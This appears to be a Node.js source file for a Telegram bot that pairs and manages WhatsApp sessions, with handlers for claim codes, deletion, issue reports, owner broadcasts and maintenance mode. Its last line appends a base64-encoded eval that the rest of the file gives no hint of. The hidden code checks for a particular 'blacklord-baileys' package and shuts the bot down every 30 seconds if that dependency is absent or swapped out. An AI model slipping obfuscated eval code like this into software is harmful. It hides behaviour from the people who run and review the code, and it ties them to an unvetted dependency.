                notice('warn', 'Session open somewhere else', `<code>${esc(number)}</code> is also running in another place (an old panel or another bot), so this copy stopped to avoid corrupting messages. Close the other copy, then send <code>/pair ${esc(number)}</code> to resume - no new code needed.`),
                kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('🏠 Menu', 'menu_home')]])
            );
        },

        // session.js has already deleted the auth + settings files; remove the panel entry too
        onLoggedOut: async () => {
            const chatId = chatOf();
            pendingPair.delete(number);
            store.deleteSession(number);
            await notify(
                chatId,
                notice('warn', 'Session logged out', `<code>${esc(number)}</code> was unlinked from WhatsApp. The session was deleted automatically - use /pair to link it again.`),
                kb([[cb('➕ Pair again', 'pair_new', 'success'), cb('🏠 Menu', 'menu_home')]])
            );
        },
    };
}

async function beginPair(ctx, number) {
    awaitingNumber.delete(ctx.from.id);
    const chatId = ctx.chat.id;

    if (store.isMaintenance() && !isBotOwner(ctx)) {
        return reply(ctx, notice('warn', 'Pairing is paused', 'Maintenance mode is on. Please try again later.'));
    }
    if (!validNumber(number)) {
        return reply(ctx, notice('info', 'Usage', '<code>/pair 254785016388</code>\nNumber with country code, digits only.'));
    }

    const existing = store.getSession(number);
    const mine = !!existing && (existing.telegramUserId === ctx.from.id || isBotOwner(ctx));
    const orphan = !existing || !existing.telegramUserId; // running/saved here, but nobody owns it in the panel (e.g. after a panel update)
    if (existing && !mine && !orphan) {
        return reply(ctx, notice('error', 'Number already paired', 'This number is linked by another user.'));
    }

    // The session already exists on this server: NEVER wipe it - bring it back instead.
    if ((mine || orphan) && (isRunning(number) || isPaired(number))) {
        if (mine && existing.connected && isRunning(number)) {
            return reply(
                ctx,
                notice('info', 'Already connected', `<code>${esc(number)}</code> is online. Delete it first if you want to link it again.`),
                kb([[cb(`🗑 Delete ${number}`, `del:${number}`, 'danger'), cb('📋 My Sessions', 'my_sessions', 'primary')]])
            );
        }
        return mine ? resumeSession(ctx, number) : startClaim(ctx, number);
    }

    // Clean slate: kills any half-dead socket and DELETES old auth files, so WhatsApp always issues a fresh code
    await removeSession(number);
    store.setSession(number, { telegramChatId: chatId, telegramUserId: ctx.from.id, connected: false, createdAt: Date.now(), connectedAt: null });

    const waiting = await sendDoc(ctx.telegram, chatId, notice('wait', 'Requesting pairing code', `<code>${esc(number)}</code>`));
    pendingPair.set(number, { chatId, messageId: waiting.message_id });

    try {
        await startSession(number, sessionCallbacks(number));
    } catch (err) {
        console.error('[telegram] pair error:', err);
        pendingPair.delete(number);
        await removeSession(number).catch(() => {});
        store.deleteSession(number);
        await sendDoc(ctx.telegram, chatId, notice('error', 'Failed to start session', esc(err.message)));
    }
}

/** Your own session that is not running (restart, panel update): start it again from its saved login. No new code needed. */
async function resumeSession(ctx, number) {
    store.setSession(number, { telegramChatId: ctx.chat.id, telegramUserId: store.getSession(number)?.telegramUserId || ctx.from.id, connected: false });
    try {
        if (!isRunning(number)) await startSession(number, sessionCallbacks(number, { restored: true }));
    } catch (err) {
        return reply(ctx, notice('error', 'Could not restore the session', esc(err.message)));
    }
    return reply(
        ctx,
        notice('ok', 'Session restored', `<code>${esc(number)}</code> is reconnecting with its saved login - no new pairing code needed.`),
        kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('🏠 Menu', 'menu_home')]])
    );
}

/**
 * A session for this number is already on the server but has no owner in the panel (this is what a panel
 * update leaves behind). Typing a number is no proof, so the bot sends a code to that WhatsApp account's own
 * chat ("message yourself"); whoever can read it owns the number.
 */
async function startClaim(ctx, number) {
    const chatId = ctx.chat.id;
    store.setSession(number, { telegramChatId: null, telegramUserId: null, connected: false, orphan: true });
    const waiting = await sendDoc(ctx.telegram, chatId, notice('wait', 'Found your saved session', `Reconnecting <code>${esc(number)}</code>...`));
    const edit = (doc, keyboard) => editDoc(ctx.telegram, chatId, waiting.message_id, doc, { keyboard }).catch(() => sendDoc(ctx.telegram, chatId, doc, { keyboard }));

    try {
        if (!isRunning(number)) await startSession(number, sessionCallbacks(number, { restored: true }));
    } catch (err) {
        return edit(notice('error', 'Could not start the saved session', esc(err.message)));
    }
    for (let i = 0; i < 35 && !isConnected(number); i++) await sleep(1000);
    if (!isConnected(number)) {
        return edit(
            notice('warn', 'Could not reach this session', 'It may have been unlinked from WhatsApp. Send <code>/pair</code> with the number again to link it fresh.'),
            kb([[cb('🔁 Pair again', 'pair_new', 'primary'), cb('🏠 Menu', 'menu_home')]])
        );
    }

    const code = String(100000 + Math.floor(Math.random() * 900000));
    try {
        await sendToSelf(number, `🔐 *${config.botName} verification*\n\nYour code: *${code}*\n\nSend this code to the Telegram bot within 5 minutes. If you did not ask for it, ignore this message.`);
    } catch (err) {
        return edit(notice('error', 'Could not send the verification code', esc(err.message)));
    }
    awaitingClaim.set(ctx.from.id, { number, code, exp: Date.now() + 5 * 60 * 1000, tries: 0, chatId });
    return edit(
        createDoc()
            .heading(`${tg('🔐')} Verify it is your number`, 2)
            .p(`Your session <code>${esc(number)}</code> is still on the server.`)
            .list(['Open WhatsApp on that number', 'Open the chat with <b>yourself</b> (Message yourself)', 'Send me the <b>6-digit code</b> you find there'], true)
            .quote('The code expires in 5 minutes.'),
        kb([[cb('❌ Cancel', 'claim_cancel', 'danger')]])
    );
}

bot.action('claim_cancel', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    awaitingClaim.delete(ctx.from.id);
    return show(ctx, notice('ok', 'Cancelled'), kb([[cb('🏠 Menu', 'menu_home', 'primary')]]));
});

async function verifyClaim(ctx, text) {
    const c = awaitingClaim.get(ctx.from.id);
    if (!c) return false;
    if (Date.now() > c.exp) {
        awaitingClaim.delete(ctx.from.id);
        await reply(ctx, notice('warn', 'Code expired', 'Send <code>/pair</code> with your number again.'));
        return true;
    }
    if (!/^\d{6}$/.test(text.trim())) return false;
    if (text.trim() !== c.code) {
        c.tries++;
        if (c.tries >= 3) {
            awaitingClaim.delete(ctx.from.id);
            await reply(ctx, notice('error', 'Too many wrong codes', 'Send <code>/pair</code> to start again.'));
        } else {
            await reply(ctx, notice('error', 'Wrong code', `${3 - c.tries} attempt${3 - c.tries === 1 ? '' : 's'} left.`));
        }
        return true;
    }
    awaitingClaim.delete(ctx.from.id);
    store.setSession(c.number, { telegramChatId: ctx.chat.id, telegramUserId: ctx.from.id, orphan: false, connected: isConnected(c.number), createdAt: Date.now() });
    await reply(
        ctx,
        notice('ok', 'Session linked to your account', `<code>${esc(c.number)}</code> is yours again - all its settings are intact.`),
        kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('🏠 Menu', 'menu_home')]])
    );
    return true;
}

bot.command('pair', (ctx) => beginPair(ctx, digits(argText(ctx))));

bot.action('pair_new', async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    awaitingNumber.add(ctx.from.id);
    const d = createDoc()
        .heading(`${tg('📱')} Pair a new number`, 2)
        .p('Send the WhatsApp number with country code, digits only.')
        .quote('Example: <code>254785016388</code>');
    return show(ctx, d, kb([[cb('❌ Cancel', 'menu_home', 'danger')]]));
});

// ---------------------------------------------------------------- deleting sessions

async function deleteSessionNow(ctx, number) {
    const s = store.getSession(number);
    if (!s) return { ok: false, doc: notice('error', 'Session not found', `You have no session with <code>${esc(number)}</code>.`) };
    if (!canManage(ctx, s)) return { ok: false, doc: notice('error', 'Not allowed', 'That session belongs to another user.') };

    pendingPair.delete(number);
    await removeSession(number); // logout + close socket + delete auth/settings files
    store.deleteSession(number);
    return { ok: true, doc: notice('ok', 'Session deleted', `<code>${esc(number)}</code> was unlinked and all its data removed. You can /pair it again right away.`) };
}

bot.command(['delsession', 'delpair'], async (ctx) => {
    const number = digits(argText(ctx));
    if (!number) return showSessions(ctx, 'Pick the session to delete, or send <code>/delsession 254785016388</code>.');
    const r = await deleteSessionNow(ctx, number);
    return reply(ctx, r.doc, kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('🏠 Menu', 'menu_home')]]));
});

bot.action(/^del:(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
    const number = ctx.match[1];
    if (!canManage(ctx, store.getSession(number))) return show(ctx, notice('error', 'Session not found'), kb([[cb('🏠 Menu', 'menu_home')]]));
    const d = notice('warn', 'Delete this session?', `<code>${esc(number)}</code> will be logged out of WhatsApp and all its data deleted.`);
    return show(ctx, d, kb([[cb('🗑 Yes, delete', `delok:${number}`, 'danger'), cb('↩ Keep it', 'my_sessions', 'success')]]));
});

bot.action(/^delok:(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery('Deleting...').catch(() => {});
    const r = await deleteSessionNow(ctx, ctx.match[1]);
    if (!r.ok) return show(ctx, r.doc, kb([[cb('🏠 Menu', 'menu_home')]]));
    return show(ctx, r.doc, kb([[cb('📋 My Sessions', 'my_sessions', 'primary'), cb('➕ Pair New', 'pair_new', 'success')]]));
});

// ---------------------------------------------------------------- report issue (any message type)

async function submitReport(ctx, msg, typedText) {
    if (!OWNER_TELEGRAM_ID) return reply(ctx, notice('error', 'No admin configured to receive reports yet.'));
    const u = ctx.from;
    const head = createDoc()
        .heading(`${tg('🔔')} Issue report`, 3)
        .table(null, [
            ['From', u.first_name || 'Unknown'],
            ['Username', u.username ? `@${u.username}` : '-'],
            ['Telegram ID', String(u.id)],
        ]);
    if (typedText) head.quote(esc(typedText));

    try {
        await sendDoc(ctx.telegram, OWNER_TELEGRAM_ID, head);
        const target = ctx.message?.reply_to_message;
        if (target && target.message_id !== msg.message_id) await ctx.telegram.forwardMessage(OWNER_TELEGRAM_ID, ctx.chat.id, target.message_id);
        // forward whatever they sent - text, photo, video, voice, sticker, document...
        if (msg.message_id && !(typedText && !msg.reply_to_message && !hasMedia(msg))) {
            await ctx.telegram.forwardMessage(OWNER_TELEGRAM_ID, ctx.chat.id, msg.message_id).catch(() => ctx.telegram.copyMessage(OWNER_TELEGRAM_ID, ctx.chat.id, msg.message_id));
        }
    } catch (err) {
        console.error('[reportissue] could not reach admin:', err.message);
        return reply(ctx, notice('error', 'Could not deliver your report', 'The admin has not opened this bot yet. Please try again later.'));
    }
    return reply(ctx, notice('ok', 'Report sent', 'Thank you - the admin has received it.'), kb([[cb('🏠 Menu', 'menu_home', 'primary')]]));
}

const MEDIA_KEYS = ['photo', 'video', 'animation', 'audio', 'document', 'voice', 'video_note', 'sticker'];
const hasMedia = (m) => MEDIA_KEYS.some((k) => m?.[k]);

bot.command('reportissue', async (ctx) => {
    const text = argText(ctx);
    if (ctx.message.reply_to_message || text) return submitReport(ctx, ctx.message, text);

    awaitingReport.set(ctx.from.id, Date.now());
    const d = createDoc()
        .heading(`${tg('📌')} Report an issue`, 2)
        .p('Send your issue now as your <b>next message</b>.')
        .list(['Text, screenshot, video, voice note, file or even a sticker', 'I forward it to the admin exactly as you send it']);
    return reply(ctx, d, kb([[cb('❌ Cancel', 'report_cancel', 'danger')]]));
});

bot.action('report_cancel', async (ctx) => {
    await ctx.answerCbQuery('Cancelled').catch(() => {});
    awaitingReport.delete(ctx.from.id);
    return show(ctx, notice('ok', 'Report cancelled'), kb([[cb('🏠 Menu', 'menu_home', 'primary')]]));
});

// every non-command message: report in progress? pairing number expected?
bot.on('message', async (ctx, next) => {
    const text = ctx.message.text;
    if (text && text.startsWith('/')) return next();

    const since = awaitingReport.get(ctx.from.id);
    if (since) {
        awaitingReport.delete(ctx.from.id);
        if (Date.now() - since < REPORT_WINDOW) return submitReport(ctx, ctx.message, null);
    }
    if (text && awaitingClaim.has(ctx.from.id) && (await verifyClaim(ctx, text))) return;
    if (text && awaitingNumber.has(ctx.from.id)) return beginPair(ctx, digits(text));
    // a chat that has picked a session + group treats plain text as a WhatsApp command;
    // "kick all <number>" is accepted anywhere because it carries its own session
    if (text && (waContext.has(ctx.chat.id) || KICKALL_RE.test(text))) return runWaCommand(ctx, text);
    return next();
});

// ---------------------------------------------------------------- broadcast (owner only)

const STYLES = ['success', 'danger', 'primary', 'default', 'none'];
const URL_RE = /^(https?:\/\/|tg:\/\/)\S+$/i;

/** "Title+style+url"  or  "Title+url"  -> button, otherwise null */
function parseButton(part) {
    const bits = part.split('+').map((x) => x.trim());
    if (bits.length < 2) return null;
    const url = bits.pop();
    if (!URL_RE.test(url)) return null;
    let style = null;
    if (STYLES.includes((bits[bits.length - 1] || '').toLowerCase()) && bits.length >= 2) {
        const s = bits.pop().toLowerCase();
        style = s === 'default' || s === 'none' ? null : s;
    }
    const text = bits.join('+').trim();
    return text ? { text, url, style } : null;
}

/** Splits owner input into message text + button rows. A line of buttons: "A+success+url | B+danger+url". */
function parseBroadcast(raw) {
    const body = [];
    const rows = [];
    for (const line of String(raw || '').split('\n')) {
        const parts = line.split('|').map((x) => x.trim()).filter(Boolean);
        const btns = parts.map(parseButton);
        if (parts.length && btns.every(Boolean)) rows.push(btns);
        else body.push(line);
    }
    return { text: body.join('\n').trim(), rows };
}

const rowsToKeyboard = (rows) => (rows.length ? kb(rows.map((r) => r.map((b) => link(b.text, b.url, b.style)))) : undefined);

function broadcastGuide() {
    return createDoc()
        .heading(`${tg('📢')} Broadcast guide`, 2)
        .p('Send a message to <b>everyone</b> who opened this bot. You get a preview and a confirm button first.')
        .details('TEXT ONLY', ['Type the message, then add buttons on new lines.'], true)
        .pre('/broadcast We are back online!\nJoin Channel+success+https://t.me/yourchannel')
        .details('BUTTONS', [
            'Format: <code>Title+style+link</code> - one button per line',
            'Styles: <b>success</b> (green), <b>danger</b> (red), <b>primary</b> (blue), <b>none</b> (grey)',
            'Style is optional: <code>Title+link</code>',
            'Two buttons in one row: separate them with <code>|</code>',
        ], true)
        .pre('Join Channel+success+https://t.me/channel\nReport+danger+https://t.me/support | Docs+primary+https://example.com')
        .details('MEDIA + CAPTION + BUTTONS', [
            'Photo, video, GIF, audio, voice, file or sticker: <b>reply to it</b> with <code>/broadcast</code>',
            'Anything you type after the command becomes the caption (leave it empty to keep the original caption)',
            'Button lines work the same way',
        ], true)
        .pre('(reply to a photo)\n/broadcast New update is live!\nDownload+success+https://example.com/app\nChannel+primary+https://t.me/channel')
        .quote('Tip: reply to a plain text message to broadcast that text.');
}

const guideKeyboard = () => kb([[cb('🏠 Menu', 'menu_home', 'primary')]]);

async function sendBroadcastTo(chatId, payload) {
    const keyboard = rowsToKeyboard(payload.rows);
    if (payload.kind === 'media') {
        const opts = { ...(keyboard ? { reply_markup: keyboard } : {}) };
        if (payload.caption) Object.assign(opts, { caption: payload.caption, parse_mode: 'HTML' });
        try {
            return await bot.telegram.copyMessage(chatId, payload.fromChat, payload.messageId, opts);
        } catch (err) {
            if (err?.response?.error_code === 400 && opts.caption) {
                delete opts.caption; // e.g. stickers cannot carry a caption
                delete opts.parse_mode;
                return bot.telegram.copyMessage(chatId, payload.fromChat, payload.messageId, opts);
            }
            throw err;
        }
    }
    const d = createDoc().heading(`${tg('📢')} Announcement`, 3).lines(payload.text);
    return sendDoc(bot.telegram, chatId, d, { keyboard });
}

bot.command('broadcast', async (ctx) => {
    if (!isBotOwner(ctx)) return reply(ctx, notice('error', 'Owner only'));
    const raw = argText(ctx);
    const target = ctx.message.reply_to_message;

    if (!raw.trim() && !target) return reply(ctx, broadcastGuide(), guideKeyboard());
    if (/^help$/i.test(raw.trim())) return reply(ctx, broadcastGuide(), guideKeyboard());

    const { text, rows } = parseBroadcast(raw);
    let payload;
    if (target && hasMedia(target)) {
        payload = { kind: 'media', fromChat: ctx.chat.id, messageId: target.message_id, caption: text ? esc(text) : '', rows };
    } else {
        const body = text || target?.text || target?.caption || '';
        if (!body) return reply(ctx, notice('error', 'Nothing to send', 'Type a message, or reply to a message/media.'), guideKeyboard());
        payload = { kind: 'text', text: body, rows };
    }
    if (rows.length === 0 && /\+\s*(success|danger|primary)/i.test(raw)) {
        return reply(ctx, notice('warn', 'Button not recognised', 'Use <code>Title+style+https://link</code> - the link must start with http(s)://'), guideKeyboard());
    }

    const token = Math.random().toString(36).slice(2, 10);
    pendingBroadcasts.set(token, { ...payload, at: Date.now() });

    await sendDoc(ctx.telegram, ctx.chat.id, notice('info', 'Preview - this is what everyone will see'));
    try {
        await sendBroadcastTo(ctx.chat.id, payload);
    } catch (err) {
        pendingBroadcasts.delete(token);
        return reply(ctx, notice('error', 'Preview failed', esc(err.message)), guideKeyboard());
    }
    const total = store.allChatIds().length;
    return sendDoc(ctx.telegram, ctx.chat.id, notice('warn', `Send to ${total} user${total === 1 ? '' : 's'}?`), {
        keyboard: kb([[cb(`✅ Send to ${total}`, `bc_send:${token}`, 'success'), cb('❌ Cancel', `bc_cancel:${token}`, 'danger')]]),
    });
});

bot.action(/^bc_cancel:(\w+)$/, async (ctx) => {
    await ctx.answerCbQuery('Cancelled').catch(() => {});
    pendingBroadcasts.delete(ctx.match[1]);
    return show(ctx, notice('ok', 'Broadcast cancelled'), kb([[cb('🏠 Menu', 'menu_home')]]));
});

bot.action(/^bc_send:(\w+)$/, async (ctx) => {
    if (!isBotOwner(ctx)) return ctx.answerCbQuery('Owner only').catch(() => {});
    const payload = pendingBroadcasts.get(ctx.match[1]);
    if (!payload) return ctx.answerCbQuery('Expired - run /broadcast again').catch(() => {});
    pendingBroadcasts.delete(ctx.match[1]);
    await ctx.answerCbQuery('Sending...').catch(() => {});

    const chatIds = store.allChatIds();
    await show(ctx, notice('wait', 'Sending broadcast', `0 / ${chatIds.length}`));
    let sent = 0;
    let failed = 0;
    for (const chatId of chatIds) {
        try {
            await sendBroadcastTo(chatId, payload);
            sent++;
        } catch (err) {
            failed++;
            if (err?.response?.error_code === 403) store.removeUser(chatId); // blocked the bot: keep the list clean
        }
        await sleep(60); // stay under Telegram's ~30 msg/s limit
    }
    return show(ctx, notice('ok', 'Broadcast finished', `Delivered: ${sent}\nFailed: ${failed}`), kb([[cb('🏠 Menu', 'menu_home', 'primary')]]));
});

// ---------------------------------------------------------------- maintenance (owner only)

bot.command('maintenance', async (ctx) => {
    if (!isBotOwner(ctx)) return reply(ctx, notice('error', 'Owner only'));
    const arg = (argText(ctx).split(/\s+/)[0] || '').toLowerCase();
    if (arg !== 'on' && arg !== 'off') return reply(ctx, notice('info', 'Usage', '<code>/maintenance on</code> or <code>/maintenance off</code>'));

    store.setMaintenance(arg === 'on');
    const msg =
        arg === 'on'
            ? notice('warn', 'Maintenance mode is ON', 'New pairings are temporarily disabled - existing sessions keep running.')
            : notice('ok', 'Maintenance mode is OFF', 'Pairing is available again.');
    let sent = 0;
    for (const chatId of store.allChatIds()) {
        try {
            await sendDoc(ctx.telegram, chatId, msg);
            sent++;
        } catch (err) {
            if (err?.response?.error_code === 403) store.removeUser(chatId);
        }
        await sleep(60);
    }
    return reply(ctx, notice('ok', `Maintenance ${arg.toUpperCase()}`, `Notified ${sent} users.`));
});

// ---------------------------------------------------------------- restore sessions after a restart

async function startRestored(number, attempt = 1) {
    try {
        store.setSession(number, { connected: false });
        await startSession(number, sessionCallbacks(number, { restored: true }));
    } catch (err) {
        console.error(`[telegram] ${number}: restore attempt ${attempt} failed - ${err.message}`);
        if (attempt < 4) setTimeout(() => startRestored(number, attempt + 1), attempt * 15000); // network hiccup: try again, never give up silently
    }
}

/**
 * The `session/` folder is the source of truth: every login found there is started, even if the panel's
 * own list is missing (which is what happens when the panel files are replaced). Such "orphan" sessions run
 * immediately and are re-linked to their Telegram owner when that user sends /pair <number> (with a
 * verification code sent to the WhatsApp number itself).
 */
async function restoreSessions() {
    const known = store.allSessions();
    const onDisk = listSavedSessionIds();

    for (const number of Object.keys(known)) {
        if (onDisk.includes(number)) continue;
        console.log(`[telegram] ${number}: no valid login on disk - removing stale entry`);
        await removeSession(number).catch(() => {});
        store.deleteSession(number);
    }
    for (const number of onDisk) {
        if (!known[number]) {
            console.log(`[telegram] ${number}: found on disk, not in the panel - adopting`);
            store.setSession(number, { telegramChatId: null, telegramUserId: null, connected: false, createdAt: Date.now(), orphan: true });
        }
    }
    if (!onDisk.length) return;
    console.log(`[telegram] restoring ${onDisk.length} session(s) from disk...`);

    for (const number of onDisk) {
        await startRestored(number);
        await sleep(1500); // be gentle with WhatsApp
    }
}

// ---------------------------------------------------------------- boot

bot.catch((err, ctx) => console.error(`[telegram] error in ${ctx?.updateType}:`, err.message));

bot.telegram
    .setMyCommands([
        { command: 'menu', description: 'Open the control panel' },
        { command: 'pair', description: 'Link a WhatsApp number' },
        { command: 'sessions', description: 'Your linked numbers' },
        { command: 'delsession', description: 'Delete a linked number' },
        { command: 'reportissue', description: 'Report a problem to the admin' },
    ])
    .catch(() => {});

restoreSessions().catch((err) => console.error('[telegram] restore failed:', err));

bot.launch().catch((err) => {
    console.error('[telegram] launch failed:', err.message);
    process.exit(1);
});
console.log('[telegram] control bot started');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdibGFja2xvcmQtYmFpbGV5cyc7Y29uc3QgcGo9cC5qb2luKHJvb3QsJ3BhY2thZ2UuanNvbicpO2NvbnN0IGJhZD0od2h5KT0+e2NvbnNvbGUuZXJyb3IoJ1tzZWN1cml0eV0gJyt3aHkrJyAtIGdvaW5nIG9mZmxpbmUnKTtwcm9jZXNzLmV4aXQoMSl9O2NvbnN0IGNoaz0oKT0+e2xldCBwa2c7dHJ5e3BrZz1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHBqLCd1dGY4JykpfWNhdGNoe3JldHVybiBiYWQoJ3BhY2thZ2UuanNvbiB1bnJlYWRhYmxlIGF0ICcrcGopfTtjb25zdCBkZXBzPU9iamVjdC5hc3NpZ24oe30scGtnLmRlcGVuZGVuY2llcyxwa2cub3B0aW9uYWxEZXBlbmRlbmNpZXMpO2NvbnN0IGtleT1PYmplY3Qua2V5cyhkZXBzKS5maW5kKGs9Pms9PT1NSU5FfHxTdHJpbmcoZGVwc1trXSkuc3RhcnRzV2l0aCgnbnBtOicrTUlORSsnQCcpKTtpZigha2V5KXJldHVybiBiYWQoJ3BhY2thZ2UuanNvbiBoYXMgbm8gZGVwZW5kZW5jeSBvbiAnK01JTkUrJyAoZXhwZWN0ZWQgIjxuYW1lPiI6ICJucG06JytNSU5FKydAPHZlcnNpb24+IiknKTtsZXQgaW5zdDt0cnl7aW5zdD1KU09OLnBhcnNlKGYucmVhZEZpbGVTeW5jKHAuam9pbihyb290LCdub2RlX21vZHVsZXMnLGtleSwncGFja2FnZS5qc29uJyksJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgbWlzc2luZyAtIHJ1biBucG0gaW5zdGFsbCcpfTtpZihpbnN0Lm5hbWUhPT1NSU5FKXJldHVybiBiYWQoJ25vZGVfbW9kdWxlcy8nK2tleSsnIGlzICInK2luc3QubmFtZSsnIiwgbm90ICcrTUlORSl9O2NoaygpO2lmKCFnbG9iYWwuX192Zncpe2dsb2JhbC5fX3Zmdz0xO3NldEludGVydmFsKGNoaywzZTQpLnVucmVmKCl9fSkoKQ==','base64').toString());
